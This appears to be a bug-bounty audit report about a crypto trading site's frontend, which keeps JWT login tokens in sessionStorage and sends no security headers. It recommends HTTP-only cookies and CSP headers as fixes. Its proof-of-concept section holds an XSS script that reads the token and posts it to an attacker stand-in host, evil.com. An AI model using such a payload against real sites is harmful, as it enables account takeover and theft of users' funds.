# #47729 \[W\&A-Insight] Insecure Token Storage in SessionStorage

**Submitted on Jun 19th 2025 at 10:19:57 UTC by @Opzteam for** [**IOP | Zano Trade**](https://immunefi.com/audit-competition/iop-zano-trade)

* **Report ID:** #47729
* **Report Type:** Websites & Apps
* **Report severity:** Insight
* **Target:** <https://github.com/PRavaga/zano-p2p/tree/master/src/pages/dex>
* **Impacts:**

## Description

* The application stores JWT authentication tokens in browser sessionStorage across the entire frontend codebase, creating a critical security vulnerability where any Cross-Site Scripting (XSS) attack could immediately compromise user accounts and financial data. With over 25 instances of `sessionStorage.getItem("token")` throughout the codebase and no security headers implemented, a single XSS vulnerability would grant attackers persistent access to user wallet addresses, trading capabilities, and administrative functions. In a financial trading platform handling cryptocurrency transactions, this represents a severe risk that could lead to unauthorized trades, fund theft, and complete account takeover.
* The vulnerability stems from the application's reliance on sessionStorage for JWT token persistence, which is accessible to any JavaScript code running in the browser context:

```
// ConnectButton.tsx - Token is stored after successful authentication
sessionStorage.setItem("token", result?.data);
```

* Token Retrieval (Throughout Application):

```
// useUpdateUser.ts - User authentication check
if (!sessionStorage.getItem("token")) return false;

// utils/methods.ts - Every API call includes token from sessionStorage
export async function getUser(): Promise<ErrorRes | GetUserRes> {
    return await axios.post("/api/user/get-user", {
        token: sessionStorage.getItem("token")  // Exposed to XSS
    }).then(res => res.data);
}

// Similar pattern in 25+ other functions
```

* JWT tokens contain critical user information:

```
interface UserData {
    alias: string;        // User wallet alias
    address: string;      // Cryptocurrency wallet address
    id?: undefined;
    favourite_currencies?: undefined;
}
```

* The Next.js configuration lacks security headers that could mitigate XSS attacks:

```
// next.config.js - No security headers configured
const nextConfig = {
  reactStrictMode: true,
  //  Missing Content-Security-Policy
  //  Missing X-Frame-Options
  //  Missing X-Content-Type-Options
  async redirects() { /* ... */ }
}
```

## Proof of Concept

## Proof of Concept

* Malicious browser extensions can access sessionStorage
* XSS Malicious Script Injection

> Token Extraction via XSS

```
<!-- Malicious payload that could be injected via any XSS vulnerability -->
<script>
// Extract JWT token
const token = sessionStorage.getItem("token");

// Decode and examine token contents (if not encrypted)
const payload = JSON.parse(atob(token.split('.')[1]));
console.log("Stolen user data:", payload);

// Exfiltrate to attacker server
fetch('https://evil.com/collect', {
    method: 'POST',
    body: JSON.stringify({
        token: token,
        userData: payload,
        origin: window.location.origin
    })
});
</script>
```

## FIX:

1. Implement HTTP-Only Cookies:

```
   // Replace sessionStorage with secure HTTP-only cookies
   // Backend: Set secure cookies
   res.cookie('authToken', token, {
       httpOnly: true,      // Not accessible via JavaScript
       secure: true,        // HTTPS only
       sameSite: 'strict',  // CSRF protection
       maxAge: 24 * 60 * 60 * 1000  // 24 hours
   });

   // Frontend: Remove all sessionStorage usage
   // Cookies are automatically sent with requests
```

2. Add Security Headers:

```
   // next.config.js
   const nextConfig = {
     async headers() {
       return [
         {
           source: '/(.*)',
           headers: [
             {
               key: 'Content-Security-Policy',
               value: "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
             },
             {
               key: 'X-Frame-Options',
               value: 'DENY'
             },
             {
               key: 'X-Content-Type-Options',
               value: 'nosniff'
             },
             {
               key: 'Strict-Transport-Security',
               value: 'max-age=31536000; includeSubDomains'
             }
           ]
         }
       ];
     }
   };
```
